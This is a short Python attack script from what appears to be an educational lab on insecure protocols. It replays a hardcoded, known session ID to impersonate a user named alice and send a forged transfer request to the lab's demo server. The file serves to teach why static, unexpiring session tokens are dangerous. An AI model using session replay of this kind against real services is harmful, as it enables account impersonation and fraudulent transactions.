# stage1_insecure_protocols/5_fixed_session_id/attacker.py

"""
attacker.py - Insecure Protocol Demo (Fixed Session ID - Attack)

This attacker reuses a known session_id to impersonate a legitimate user
(alice) and perform a forged transaction. This demonstrates the danger of
static, long-lived session tokens with no expiry or verification.

Usage:
    python attacker.py --port 9000
"""

import argparse

from config import DEFAULT_HOST

from utils.attacker_runner import run_tcp_attack

parser = argparse.ArgumentParser()
parser.add_argument("--port", type=int, required=True, help="Port to connect to")
args = parser.parse_args()

server_host = DEFAULT_HOST
server_port = args.port

# Reuse a known session_id to impersonate a legitimate user and escalate privileges
plain_text = "session_id=abc123&action=transfer&amount=999999"
message = "session_id=abc123&action=transfer&amount=999999"

# Send the forged session-based request to the target server
response = run_tcp_attack(
    host=server_host,
    port=server_port,
    plain_text=plain_text,
    payload=message,
    verbose=True
)

print()